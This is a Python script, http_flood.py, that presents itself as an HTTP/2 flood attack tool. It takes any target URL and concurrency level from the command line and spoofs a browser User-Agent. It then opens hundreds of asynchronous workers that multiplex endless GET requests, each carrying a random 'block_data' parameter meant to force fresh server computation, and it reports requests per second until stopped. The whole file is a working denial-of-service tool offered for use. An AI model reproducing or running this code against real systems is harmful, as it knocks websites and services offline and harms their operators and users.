# http_flood.py

import httpx
import asyncio
import threading
import time
import sys
import random
import string
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
# Get target URL from command-line arguments
if len(sys.argv) < 2:
    print("Usage: python http_flood.py <URL> [thread_count]")
    sys.exit(1)

target_url = sys.argv[1]
# Get concurrent connection count from command-line or use default
concurrent_connections = int(sys.argv[2]) if len(sys.argv) > 2 else 100

print(f"Attacking {target_url} with {concurrent_connections} concurrent HTTP/2 connections.")

# This user agent makes the request look like it's from a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Global counter for successful requests
successful_requests = 0
running = True

def generate_random_block_data():
    """
    Generates a random scrambled string and send it to the server.
    This ensures each request requires unique computational work on the server.
    """
    # Generate random length between 20-100 characters
    length = random.randint(20, 100)
    
    # Mix of letters, numbers, and some special characters
    chars = string.ascii_letters + string.digits + '_-.'
    
    # Generate random string
    random_data = ''.join(random.choice(chars) for _ in range(length))
    
    # Add some realistic blockchain-like prefixes occasionally
    prefixes = ['block_', 'tx_', 'data_', 'hash_', 'chain_']
    if random.random() < 0.3:  # 30% chance to add prefix
        random_data = random.choice(prefixes) + random_data
    
    return random_data

async def attack_worker(client, semaphore):
    """
    Individual HTTP/2 attack worker using shared client connection.
    Uses HTTP/2 multiplexing to send multiple requests over single connection.
    """
    global successful_requests
    while running:
        async with semaphore:
            try:
                # Generate random block data for this request
                block_data = generate_random_block_data()
                
                # Send GET request with block_data parameter to force server computation
                params = {'block_data': block_data}
                response = await client.get(target_url, headers=headers, params=params, timeout=10.0)
                
                # We consider any 2xx or 3xx status code a "success"
                if 200 <= response.status_code < 400:
                    successful_requests += 1
                    # Occasionally print successful computation details
                    if successful_requests % 50 == 0:
                        try:
                            result = response.json()
                            print(f"Server computed: Block={result.get('block_data', '')[:20]}..., Nonce={result.get('nonce', 'N/A')}")
                        except:
                            pass

            except httpx.RequestError:
                # This will catch timeouts, connection errors, etc.
                pass
            except Exception:
                pass

async def http2_attack():
    """
    Main HTTP/2 attack function using connection multiplexing.
    Creates fewer connections but sends more requests per connection.
    """
    # Create semaphore to limit concurrent requests
    semaphore = asyncio.Semaphore(concurrent_connections)
    
    # Use HTTP/2 client with connection pooling
    limits = httpx.Limits(max_keepalive_connections=50, max_connections=100)
    async with httpx.AsyncClient(http2=True, limits=limits, timeout=httpx.Timeout(10.0)) as client:
        # Create multiple concurrent workers
        tasks = []
        for _ in range(concurrent_connections * 2):  # More tasks than semaphore allows
            task = asyncio.create_task(attack_worker(client, semaphore))
            tasks.append(task)
        
        try:
            # Wait for all tasks to complete (they won't until interrupted)
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

def print_stats():
    """
    Prints the number of requests per second.
    """
    global successful_requests
    last_count = 0
    while running:
        time.sleep(1)
        # Calculate requests per second
        requests_per_second = successful_requests - last_count
        print(f"Requests/sec: {requests_per_second}")
        last_count = successful_requests

def run_attack_with_stats():
    """
    Wrapper function to run HTTP/2 attack with statistics in separate thread.
    """
    # Start the statistics thread
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    # Run the HTTP/2 attack
    try:
        asyncio.run(http2_attack())
    except KeyboardInterrupt:
        print("\nStopping HTTP/2 attack...")
        global running
        running = False
        print("Attack finished.")

if __name__ == "__main__":
    print("Starting HTTP/2 flood attack...")
    print("This attack uses HTTP/2 multiplexing to send multiple requests per connection.")
    print("Press Ctrl+C to stop the attack.")
    
    run_attack_with_stats()